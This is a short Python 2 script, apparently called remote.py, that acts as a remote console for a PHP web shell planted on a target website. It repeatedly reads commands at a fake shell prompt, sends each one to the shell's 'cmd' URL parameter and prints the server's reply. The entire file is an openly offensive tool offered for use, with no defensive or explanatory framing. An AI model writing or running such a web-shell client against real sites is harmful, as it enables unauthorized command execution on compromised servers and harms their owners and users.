import time
import requests
import sys

if len(sys.argv) < 2:
	print "\n[!] Use: remote.py https://target.com/shel.php\n"
	sys.exit()

i = sys.argv[1]
print "~ Exploit To "+i
print ""
time.sleep(3)
while True:
    try:
        c = raw_input("sxc@"+i+":~$ ")
        r = requests.get(i+"?cmd="+c)
        print r.text
    except Exception:
        print "cek url"
        break

